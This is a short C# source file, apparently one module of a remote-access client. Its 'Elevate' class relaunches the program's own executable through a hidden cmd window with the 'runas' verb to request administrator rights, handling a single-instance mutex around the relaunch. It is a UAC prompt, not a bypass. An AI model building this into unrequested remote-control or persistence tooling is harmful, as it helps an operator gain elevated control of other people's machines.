using Client.Config;
using Client.Core.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class Elevate
    {
        public static void Execute(string data)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                try
                {
                    Process.Start(processStartInfo);

                    //Success. Close current

                    if (System.Windows.Forms.Application.MessageLoop)
                    {
                        // WinForms app
                        System.Windows.Forms.Application.Exit();
                    }
                    else
                    {
                        // Console app
                        System.Environment.Exit(1);
                    }
                }
                catch
                {
                    //Refused
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
            }
            else
            {
                //Already elevated
            }
        }
    }
}
